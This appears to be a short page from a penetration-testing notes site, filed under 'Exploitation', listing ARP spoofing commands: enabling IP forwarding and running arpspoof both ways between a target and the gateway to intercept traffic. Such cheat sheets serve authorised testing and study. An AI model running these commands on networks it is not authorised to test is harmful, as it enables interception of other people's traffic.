---
layout: default
title: Spoofing
parent: Exploitation
nav_order: 1
---

# Spoofing
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

### ARP Spoofing

`echo 1 > /proc/sys/net/ipv4/ip_forward` - enables IP forwarding   
`arpspoof -i <int> -t <target ip addr> -r <host to spoof i.e. gw>`  
`arpspoof -i <int> -r <host to spoof i.e. gw> -t <target ip addr>`  

